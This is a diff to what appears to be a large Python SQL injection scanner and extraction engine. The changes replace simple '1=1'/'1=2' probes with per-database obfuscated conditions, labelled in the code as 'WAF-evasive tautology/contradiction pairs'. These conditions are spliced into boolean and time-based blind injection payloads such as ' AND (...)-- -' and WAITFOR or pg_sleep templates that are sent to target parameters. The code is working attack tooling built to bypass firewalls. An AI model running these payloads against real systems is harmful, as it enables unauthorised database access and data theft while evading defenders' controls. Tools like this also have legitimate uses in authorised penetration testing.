+                        "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                        "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                        "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                        "MySQL":           "LEAST(2e0,3e0)>(0e0)",
+                        "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
+                        "TiDB":            "LEAST(2e0,3e0)>(0e0)",
+                        "MSSQL":           "ABS(-1e0)>(0e0)",
+                        "Sybase":          "ABS(-1e0)>(0e0)",
+                        "Oracle":          "NVL(NULL,1e0)>(0e0)",
+                        "SQLite":          "MIN(2e0,3e0)>(0e0)",
+                        "DB2":             "ABS(-1e0)>(0e0)",
+                        "Firebird":        "ABS(-1e0)>(0e0)",
+                        "H2":              "ABS(-1e0)>(0e0)",
+                        "ClickHouse":      "least(2e0,3e0)>(0e0)",
+                        "Informix":        "ABS(-1e0)>(0e0)",
+                        "SAP_HANA":        "ABS(-1e0)>(0e0)",
+                    }.get(_dbms, "1e0<2e0")
+                    _defer_san_false_cond = {
+                        "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                        "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                        "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                        "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                        "MySQL":           "GREATEST(2e0,3e0)<(0e0)",
+                        "MariaDB":         "GREATEST(2e0,3e0)<(0e0)",
+                        "TiDB":            "GREATEST(2e0,3e0)<(0e0)",
+                        "MSSQL":           "ABS(-1e0)<(0e0)",
+                        "Sybase":          "ABS(-1e0)<(0e0)",
+                        "Oracle":          "NVL(NULL,1e0)<(0e0)",
+                        "SQLite":          "MIN(2e0,3e0)<(0e0)",
+                        "DB2":             "ABS(-1e0)<(0e0)",
+                        "Firebird":        "ABS(-1e0)<(0e0)",
+                        "H2":              "ABS(-1e0)<(0e0)",
+                        "ClickHouse":      "least(2e0,3e0)<(0e0)",
+                        "Informix":        "ABS(-1e0)<(0e0)",
+                        "SAP_HANA":        "ABS(-1e0)<(0e0)",
+                    }.get(_dbms, "2e0<1e0")
+                    _san_t = await _waf_aware_eval(_defer_san_true_cond)
                     await asyncio.sleep(_delay * 0.5)
-                    _san_f = await _waf_aware_eval("1=2")
+                    _san_f = await _waf_aware_eval(_defer_san_false_cond)
                     # BUG-ORACLE-SANITY-IS-CHECK FIX: `is True`/`is False` only matches Python
                     # singleton booleans. Comparison operators (ms >= _thresh, _sim_gap > 0)
                     # always produce singletons in CPython, but use explicit not/bool guards
@@ -62170,6 +62366,48 @@ class Scanner:
 
         _delay = max(getattr(cfg, "delay", 5.0) or 5.0, 3.0)
 
+        _direct_cal_dbms = (getattr(cfg, 'forced_dbms', None) or
+                            getattr(cfg, 'dbms', None) or
+                            getattr(cfg, '_detected_dbms', None) or '') or ''
+        _direct_cal_true = {
+            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "MySQL":           "LEAST(2e0,3e0)>(0e0)",
+            "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
+            "TiDB":            "LEAST(2e0,3e0)>(0e0)",
+            "MSSQL":           "ABS(-1e0)>(0e0)",
+            "Sybase":          "ABS(-1e0)>(0e0)",
+            "Oracle":          "NVL(NULL,1e0)>(0e0)",
+            "SQLite":          "MIN(2e0,3e0)>(0e0)",
+            "DB2":             "ABS(-1e0)>(0e0)",
+            "Firebird":        "ABS(-1e0)>(0e0)",
+            "H2":              "ABS(-1e0)>(0e0)",
+            "ClickHouse":      "least(2e0,3e0)>(0e0)",
+            "Informix":        "ABS(-1e0)>(0e0)",
+            "SAP_HANA":        "ABS(-1e0)>(0e0)",
+        }.get(_direct_cal_dbms, "1e0<2e0")
+        _direct_cal_false = {
+            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "MySQL":           "GREATEST(2e0,3e0)<(0e0)",
+            "MariaDB":         "GREATEST(2e0,3e0)<(0e0)",
+            "TiDB":            "GREATEST(2e0,3e0)<(0e0)",
+            "MSSQL":           "ABS(-1e0)<(0e0)",
+            "Sybase":          "ABS(-1e0)<(0e0)",
+            "Oracle":          "NVL(NULL,1e0)<(0e0)",
+            "SQLite":          "MIN(2e0,3e0)<(0e0)",
+            "DB2":             "ABS(-1e0)<(0e0)",
+            "Firebird":        "ABS(-1e0)<(0e0)",
+            "H2":              "ABS(-1e0)<(0e0)",
+            "ClickHouse":      "least(2e0,3e0)<(0e0)",
+            "Informix":        "ABS(-1e0)<(0e0)",
+            "SAP_HANA":        "ABS(-1e0)<(0e0)",
+        }.get(_direct_cal_dbms, "2e0<1e0")
+
         LOG.info("[Direct] Calibrating (8s cooldown, then 2 probes)...")
         await asyncio.sleep(8)
 
@@ -62177,9 +62415,9 @@ class Scanner:
         # the 30s reactive retry — prevents calibration giving margin=0ms when CDN-locked.
         # BUG-DIRECT-NO-BOOL-FALLBACK FIX: capture fp as well as ms so we can measure
         # body-size difference and use a boolean fallback when timing margin is too low.
-        _fp_calib_t, ms_t = await _send_d_timed(_template.replace("{cond}", "1=1"))
+        _fp_calib_t, ms_t = await _send_d_timed(_template.replace("{cond}", _direct_cal_true))
         await asyncio.sleep(_delay)
-        _fp_calib_f, ms_f = await _send_d_timed(_template.replace("{cond}", "1=2"))
+        _fp_calib_f, ms_f = await _send_d_timed(_template.replace("{cond}", _direct_cal_false))
 
         _margin = ms_t - ms_f
         LOG.info("[Direct] true=%.0fms false=%.0fms margin=%.0fms", ms_t, ms_f, _margin)
@@ -63942,7 +64180,7 @@ class Scanner:
                     else:
                         _sys_table = "information_schema.tables"
                         _sys_col = "table_name"
-                        _sys_where = "1=1"
+                        _sys_where = "table_name IS NOT NULL"
                     
                     if "sleep_arith" in _mse._oracles and _mse._stacked:
                         # FROM-based: flat comparison in pg_sleep arg
@@ -83676,8 +83914,47 @@ class BitwiseExtractor:
                     return None
                 _pc_nb = _normalise_response_safe(_pc_fp, func_name="BitwiseExtractor.polarity_cal", default=b"")
                 return SimHasher.body_similarity(self._norm_sample, _pc_nb) if _pc_nb else None
+            _bwe_pol_dbms = dbms or ''
+            _bwe_pol_true = {
+                "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                "MySQL":           "LEAST(2e0,3e0)>(0e0)",
+                "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
+                "TiDB":            "LEAST(2e0,3e0)>(0e0)",
+                "MSSQL":           "ABS(-1e0)>(0e0)",
+                "Sybase":          "ABS(-1e0)>(0e0)",
+                "Oracle":          "NVL(NULL,1e0)>(0e0)",
+                "SQLite":          "MIN(2e0,3e0)>(0e0)",
+                "DB2":             "ABS(-1e0)>(0e0)",
+                "Firebird":        "ABS(-1e0)>(0e0)",
+                "H2":              "ABS(-1e0)>(0e0)",
+                "ClickHouse":      "least(2e0,3e0)>(0e0)",
+                "Informix":        "ABS(-1e0)>(0e0)",
+                "SAP_HANA":        "ABS(-1e0)>(0e0)",
+            }.get(_bwe_pol_dbms, "1e0<2e0")
+            _bwe_pol_false = {
+                "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                "MySQL":           "GREATEST(2e0,3e0)<(0e0)",
+                "MariaDB":         "GREATEST(2e0,3e0)<(0e0)",
+                "TiDB":            "GREATEST(2e0,3e0)<(0e0)",
+                "MSSQL":           "ABS(-1e0)<(0e0)",
+                "Sybase":          "ABS(-1e0)<(0e0)",
+                "Oracle":          "NVL(NULL,1e0)<(0e0)",
+                "SQLite":          "MIN(2e0,3e0)<(0e0)",
+                "DB2":             "ABS(-1e0)<(0e0)",
+                "Firebird":        "ABS(-1e0)<(0e0)",
+                "H2":              "ABS(-1e0)<(0e0)",
+                "ClickHouse":      "least(2e0,3e0)<(0e0)",
+                "Informix":        "ABS(-1e0)<(0e0)",
+                "SAP_HANA":        "ABS(-1e0)<(0e0)",
+            }.get(_bwe_pol_dbms, "2e0<1e0")
             _sim_true_cal, _sim_false_cal = await asyncio.gather(
-                _bwe_calib("1=1"), _bwe_calib("1=2"))
+                _bwe_calib(_bwe_pol_true), _bwe_calib(_bwe_pol_false))
             if _sim_true_cal is not None and _sim_false_cal is not None:
                 self._polarity_inverted = bool(_sim_false_cal > _sim_true_cal)
                 if self._polarity_inverted:
@@ -96914,9 +97191,47 @@ class ScannerV11(ScannerV10):
                                 # makes every failed probe appear True.
                                 return 0.0
                             return (time.monotonic() - t0) * 1000
-                        _ms_t11 = await _probe11("1=1")
+                        _v11_cal_true = {
+                            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                            "MySQL":           "LEAST(2e0,3e0)>(0e0)",
+                            "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
+                            "TiDB":            "LEAST(2e0,3e0)>(0e0)",
+                            "MSSQL":           "ABS(-1e0)>(0e0)",
+                            "Sybase":          "ABS(-1e0)>(0e0)",
+                            "Oracle":          "NVL(NULL,1e0)>(0e0)",
+                            "SQLite":          "MIN(2e0,3e0)>(0e0)",
+                            "DB2":             "ABS(-1e0)>(0e0)",
+                            "Firebird":        "ABS(-1e0)>(0e0)",
+                            "H2":              "ABS(-1e0)>(0e0)",
+                            "ClickHouse":      "least(2e0,3e0)>(0e0)",
+                            "Informix":        "ABS(-1e0)>(0e0)",
+                            "SAP_HANA":        "ABS(-1e0)>(0e0)",
+                        }.get(_dbms11, "1e0<2e0")
+                        _v11_cal_false = {
+                            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                            "MySQL":           "GREATEST(2e0,3e0)<(0e0)",
+                            "MariaDB":         "GREATEST(2e0,3e0)<(0e0)",
+                            "TiDB":            "GREATEST(2e0,3e0)<(0e0)",
+                            "MSSQL":           "ABS(-1e0)<(0e0)",
+                            "Sybase":          "ABS(-1e0)<(0e0)",
+                            "Oracle":          "NVL(NULL,1e0)<(0e0)",
+                            "SQLite":          "MIN(2e0,3e0)<(0e0)",
+                            "DB2":             "ABS(-1e0)<(0e0)",
+                            "Firebird":        "ABS(-1e0)<(0e0)",
+                            "H2":              "ABS(-1e0)<(0e0)",
+                            "ClickHouse":      "least(2e0,3e0)<(0e0)",
+                            "Informix":        "ABS(-1e0)<(0e0)",
+                            "SAP_HANA":        "ABS(-1e0)<(0e0)",
+                        }.get(_dbms11, "2e0<1e0")
+                        _ms_t11 = await _probe11(_v11_cal_true)
                         await asyncio.sleep(_delay11)
-                        _ms_f11 = await _probe11("1=2")
+                        _ms_f11 = await _probe11(_v11_cal_false)
                         if abs(_ms_t11 - _ms_f11) >= 80:
                             _thresh11 = (_ms_t11 + _ms_f11) / 2
                             # was hi11=64 — truncated strings longer than 64 chars
@@ -119063,6 +119378,23 @@ class TechniqueCascadeEngine:
             ("DBMS_PIPE.RECEIVE_MESSAGE('sqrdc2',2),0)>=0", "DBMS_PIPE.RECEIVE_MESSAGE('sqrdc2',0),0)>=0"),
             ("DBMS_PIPE.RECEIVE_MESSAGE('sqrdc3',3),0)>=0", "DBMS_PIPE.RECEIVE_MESSAGE('sqrdc3',0),0)>=0"),
             # ── Most specific patterns first (order matters) ──────────────────
+            # WAF-evasive tautology  contradiction pairs
+            ("ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+             "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)"),
+            ("ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+             "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)"),
+            ("LEAST(2e0,3e0)>(0e0)",    "GREATEST(2e0,3e0)<(0e0)"),
+            ("GREATEST(2e0,3e0)<(0e0)", "LEAST(2e0,3e0)>(0e0)"),
+            ("ABS(-1e0)>(0e0)",         "ABS(-1e0)<(0e0)"),
+            ("ABS(-1e0)<(0e0)",         "ABS(-1e0)>(0e0)"),
+            ("NVL(NULL,1e0)>(0e0)",     "NVL(NULL,1e0)<(0e0)"),
+            ("NVL(NULL,1e0)<(0e0)",     "NVL(NULL,1e0)>(0e0)"),
+            ("MIN(2e0,3e0)>(0e0)",      "MIN(2e0,3e0)<(0e0)"),
+            ("MIN(2e0,3e0)<(0e0)",      "MIN(2e0,3e0)>(0e0)"),
+            ("least(2e0,3e0)>(0e0)",    "least(2e0,3e0)<(0e0)"),
+            ("least(2e0,3e0)<(0e0)",    "least(2e0,3e0)>(0e0)"),
+            ("1e0<2e0",                 "2e0<1e0"),
+            ("2e0<1e0",                 "1e0<2e0"),
             # Boolean tautology → contradiction
             ("1=1", "1=2"), ("'a'='a'", "'a'='b'"),
             ("2=2", "2=3"), ("3=3", "3=4"), ("0=0", "0=1"),
@@ -120812,10 +121144,28 @@ class UniversalScanOrchestrator:
                                             # If sim(baseline, TRUE_response) < threshold → reversed polarity.
                                             _ibo_inverted = [False]
                                             try:
+                                                _ibo_pol_dbms = (getattr(_det_for_oracle, 'dbms', '') or
+                                                                 getattr(result, 'dbms', '') or
+                                                                 getattr(_scanner_ref.config, 'forced_dbms', '') or
+                                                                 getattr(_scanner_ref.config, 'dbms', '') or
+                                                                 'PostgreSQL')
+                                                _ibo_pol_true = {
+                                                    "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                                                    "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                                                    "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                                                    "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                                                    "MySQL":           "LEAST(2e0,3e0)>(0e0)",
+                                                    "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
+                                                    "TiDB":            "LEAST(2e0,3e0)>(0e0)",
+                                                    "MSSQL":           "ABS(-1e0)>(0e0)",
+                                                    "Sybase":          "ABS(-1e0)>(0e0)",
+                                                    "Oracle":          "NVL(NULL,1e0)>(0e0)",
+                                                    "SQLite":          "MIN(2e0,3e0)>(0e0)",
+                                                }.get(_ibo_pol_dbms, "1e0<2e0")
                                                 if _bool_tmpl:
-                                                    _cal_pay = _bool_tmpl.replace('[INFERENCE]', '1=1')
+                                                    _cal_pay = _bool_tmpl.replace('[INFERENCE]', _ibo_pol_true)
                                                 else:
-                                                    _cal_pay = f" AND (1=1)-- -"
+                                                    _cal_pay = f" AND ({_ibo_pol_true})-- -"
                                                 _cal_fp = await asyncio.wait_for(
                                                     _send_injected(_scanner_ref.engine, method, url, data, data_fmt,
                                                                    _det_param, _det_orig + _cal_pay, _det_tamper),
@@ -121743,13 +122093,45 @@ class UniversalScanOrchestrator:
                                                         _det_for_wb_check = _det_for_oracle
                                                         _wb_tmpl_early = _build_det_template(_det_for_wb_check) if _det_for_wb_check else ''
                                                         _wb_ipfx_early = _derive_inj_prefix(_det_for_wb_check) if _det_for_wb_check else ''
+                                                        _wb_cal_dbms = (getattr(_det_for_wb_check, 'dbms', '') or
+                                                                        getattr(_det_for_oracle, 'dbms', '') or
+                                                                        getattr(result, 'dbms', '') or
+                                                                        getattr(_scanner_ref.config, 'forced_dbms', '') or
+                                                                        getattr(_scanner_ref.config, 'dbms', '') or
+                                                                        'PostgreSQL')
+                                                        _wb_cal_true = {
+                                                            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                                                            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                                                            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                                                            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                                                            "MySQL":           "LEAST(2e0,3e0)>(0e0)",
+                                                            "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
+                                                            "TiDB":            "LEAST(2e0,3e0)>(0e0)",
+                                                            "MSSQL":           "ABS(-1e0)>(0e0)",
+                                                            "Sybase":          "ABS(-1e0)>(0e0)",
+                                                            "Oracle":          "NVL(NULL,1e0)>(0e0)",
+                                                            "SQLite":          "MIN(2e0,3e0)>(0e0)",
+                                                        }.get(_wb_cal_dbms, "1e0<2e0")
+                                                        _wb_cal_false = {
+                                                            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                                                            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                                                            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                                                            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                                                            "MySQL":           "GREATEST(2e0,3e0)<(0e0)",
+                                                            "MariaDB":         "GREATEST(2e0,3e0)<(0e0)",
+                                                            "TiDB":            "GREATEST(2e0,3e0)<(0e0)",
+                                                            "MSSQL":           "ABS(-1e0)<(0e0)",
+                                                            "Sybase":          "ABS(-1e0)<(0e0)",
+                                                            "Oracle":          "NVL(NULL,1e0)<(0e0)",
+                                                            "SQLite":          "MIN(2e0,3e0)<(0e0)",
+                                                        }.get(_wb_cal_dbms, "2e0<1e0")
                                                         # TRUE probe
                                                         if _wb_tmpl_early:
-                                                            _ibw_sc_t = _det_orig + _wb_tmpl_early.replace('[INFERENCE]', '1=1')
-                                                            _ibw_sc_f = _det_orig + _wb_tmpl_early.replace('[INFERENCE]', '1=2')
+                                                            _ibw_sc_t = _det_orig + _wb_tmpl_early.replace('[INFERENCE]', _wb_cal_true)
+                                                            _ibw_sc_f = _det_orig + _wb_tmpl_early.replace('[INFERENCE]', _wb_cal_false)
                                                         else:
-                                                            _ibw_sc_t = f"{_det_orig}{_wb_ipfx_early} AND (1=1)-- -"
-                                                            _ibw_sc_f = f"{_det_orig}{_wb_ipfx_early} AND (1=2)-- -"
+                                                            _ibw_sc_t = f"{_det_orig}{_wb_ipfx_early} AND ({_wb_cal_true})-- -"
+                                                            _ibw_sc_f = f"{_det_orig}{_wb_ipfx_early} AND ({_wb_cal_false})-- -"
                                                         _ibw_sc_fp_t = await asyncio.wait_for(
                                                             _send_injected(_scanner_ref.engine, method, url, data, data_fmt,
                                                                            _det_param, _ibw_sc_t, _det_tamper), timeout=10)
@@ -121857,11 +122239,29 @@ class UniversalScanOrchestrator:
                                                 # If sim(baseline, TRUE_response) < threshold → reversed polarity.
                                                 _ibw_inverted = [False]
                                                 try:
+                                                    _ibw_pol_dbms = (getattr(_det_for_oracle, 'dbms', '') or
+                                                                     getattr(result, 'dbms', '') or
+                                                                     getattr(_scanner_ref.config, 'forced_dbms', '') or
+                                                                     getattr(_scanner_ref.config, 'dbms', '') or
+                                                                     'PostgreSQL')
+                                                    _ibw_pol_true = {
+                                                        "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                                                        "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                                                        "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                                                        "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                                                        "MySQL":           "LEAST(2e0,3e0)>(0e0)",
+                                                        "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
+                                                        "TiDB":            "LEAST(2e0,3e0)>(0e0)",
+                                                        "MSSQL":           "ABS(-1e0)>(0e0)",
+                                                        "Sybase":          "ABS(-1e0)>(0e0)",
+                                                        "Oracle":          "NVL(NULL,1e0)>(0e0)",
+                                                        "SQLite":          "MIN(2e0,3e0)>(0e0)",
+                                                    }.get(_ibw_pol_dbms, "1e0<2e0")
                                                     if _wb_tmpl:
-                                                        _ibw_cal_pay = _wb_tmpl.replace('[INFERENCE]', '1=1')
+                                                        _ibw_cal_pay = _wb_tmpl.replace('[INFERENCE]', _ibw_pol_true)
                                                         _ibw_cal_full = _det_orig + _ibw_cal_pay
                                                     else:
-                                                        _ibw_cal_full = f"{_det_orig}{_wb_inj_pfx} AND (1=1)-- -"
+                                                        _ibw_cal_full = f"{_det_orig}{_wb_inj_pfx} AND ({_ibw_pol_true})-- -"
                                                     _ibw_cal_fp = await asyncio.wait_for(
                                                         _send_injected(_scanner_ref.engine, method, url, data, data_fmt,
                                                                        _det_param, _ibw_cal_full, _det_tamper),
@@ -131943,6 +132343,45 @@ class MultiStrategyExtractor:
                     return False
 
         # Test with T=3, 5, 2 using _timed_raw (NO double tampering)
+        _sa_dbms = getattr(self, 'dbms', '') or ''
+        _sa_true_cond = {
+            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "MySQL":           "LEAST(2e0,3e0)>(0e0)",
+            "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
+            "TiDB":            "LEAST(2e0,3e0)>(0e0)",
+            "MSSQL":           "ABS(-1e0)>(0e0)",
+            "Sybase":          "ABS(-1e0)>(0e0)",
+            "Oracle":          "NVL(NULL,1e0)>(0e0)",
+            "SQLite":          "MIN(2e0,3e0)>(0e0)",
+            "DB2":             "ABS(-1e0)>(0e0)",
+            "Firebird":        "ABS(-1e0)>(0e0)",
+            "H2":              "ABS(-1e0)>(0e0)",
+            "ClickHouse":      "least(2e0,3e0)>(0e0)",
+            "Informix":        "ABS(-1e0)>(0e0)",
+            "SAP_HANA":        "ABS(-1e0)>(0e0)",
+        }.get(_sa_dbms, "1e0<2e0")
+        _sa_false_cond = {
+            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "MySQL":           "GREATEST(2e0,3e0)<(0e0)",
+            "MariaDB":         "GREATEST(2e0,3e0)<(0e0)",
+            "TiDB":            "GREATEST(2e0,3e0)<(0e0)",
+            "MSSQL":           "ABS(-1e0)<(0e0)",
+            "Sybase":          "ABS(-1e0)<(0e0)",
+            "Oracle":          "NVL(NULL,1e0)<(0e0)",
+            "SQLite":          "MIN(2e0,3e0)<(0e0)",
+            "DB2":             "ABS(-1e0)<(0e0)",
+            "Firebird":        "ABS(-1e0)<(0e0)",
+            "H2":              "ABS(-1e0)<(0e0)",
+            "ClickHouse":      "least(2e0,3e0)<(0e0)",
+            "Informix":        "ABS(-1e0)<(0e0)",
+            "SAP_HANA":        "ABS(-1e0)<(0e0)",
+        }.get(_sa_dbms, "2e0<1e0")
         _best_t, _best_margin = 3, 0
         for _t in [3, 5, 2]:
             # BUG-MSSQL-WAITFOR-FORMAT FIX: Replace the __WAITFOR_SAFE__ sentinel with a
@@ -131956,11 +132395,11 @@ class MultiStrategyExtractor:
                         .replace("{T}", str(t_val))
                         .replace("{cond}", cond_str))
             if "__WAITFOR_SAFE__" in _tmpl_base:
-                _tp = _fmt_waitfor(_tmpl_base, _t, "1=1")
-                _fp = _fmt_waitfor(_tmpl_base, _t, "1=2")
+                _tp = _fmt_waitfor(_tmpl_base, _t, _sa_true_cond)
+                _fp = _fmt_waitfor(_tmpl_base, _t, _sa_false_cond)
             else:
-                _tp = _tmpl_base.replace("{T}", str(_t)).replace("{cond}", "1=1")
-                _fp = _tmpl_base.replace("{T}", str(_t)).replace("{cond}", "1=2")
+                _tp = _tmpl_base.replace("{T}", str(_t)).replace("{cond}", _sa_true_cond)
+                _fp = _tmpl_base.replace("{T}", str(_t)).replace("{cond}", _sa_false_cond)
             # Try with tamper chain
             _, ms_t = await self._timed(_tp)
             await asyncio.sleep(0.4)
@@ -131996,10 +132435,10 @@ class MultiStrategyExtractor:
         _timed_fn = self._timed_raw if _best_raw else self._timed
         _tt, _ft = [], []
         for _ in range(4):
-            _, ms = await _timed_fn(_tmpl.replace("{cond}", "1=1"))
+            _, ms = await _timed_fn(_tmpl.replace("{cond}", _sa_true_cond))
             if ms > 30: _tt.append(ms)
             await asyncio.sleep(0.5)
-            _, ms = await _timed_fn(_tmpl.replace("{cond}", "1=2"))
+            _, ms = await _timed_fn(_tmpl.replace("{cond}", _sa_false_cond))
             if ms > 30: _ft.append(ms)
             await asyncio.sleep(0.5)
 
@@ -132132,7 +132571,27 @@ class MultiStrategyExtractor:
                         # All others: bare arithmetic expression as CASE WHEN cond.
                         # CASE WHEN 1/0 THEN ... triggers div-by-zero immediately.
                         _pe = self._build_inline(_inline_err_expr)
-                    _po = self._build_inline("1=1")
+                    _mse_err_ok_dbms = getattr(self, 'dbms', '') or ''
+                    _mse_err_ok_cond = {
+                        "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                        "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                        "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                        "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                        "MySQL":           "LEAST(2e0,3e0)>(0e0)",
+                        "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
+                        "TiDB":            "LEAST(2e0,3e0)>(0e0)",
+                        "MSSQL":           "ABS(-1e0)>(0e0)",
+                        "Sybase":          "ABS(-1e0)>(0e0)",
+                        "Oracle":          "NVL(NULL,1e0)>(0e0)",
+                        "SQLite":          "MIN(2e0,3e0)>(0e0)",
+                        "DB2":             "ABS(-1e0)>(0e0)",
+                        "Firebird":        "ABS(-1e0)>(0e0)",
+                        "H2":              "ABS(-1e0)>(0e0)",
+                        "ClickHouse":      "least(2e0,3e0)>(0e0)",
+                        "Informix":        "ABS(-1e0)>(0e0)",
+                        "SAP_HANA":        "ABS(-1e0)>(0e0)",
+                    }.get(_mse_err_ok_dbms, "1e0<2e0")
+                    _po = self._build_inline(_mse_err_ok_cond)
                     if _name != "div0":
                         continue  # Only div0 is WAF-safe in inline mode without SELECT
 
@@ -132374,7 +132833,27 @@ class MultiStrategyExtractor:
                 _heavy_variants.append((f"xjoin{_n}",
                     self._build_stacked(f"SELECT COUNT(*) FROM {_aliases}") if self._stacked
                     else self._build_inline(f"(SELECT COUNT(*) FROM {_aliases})>0")))
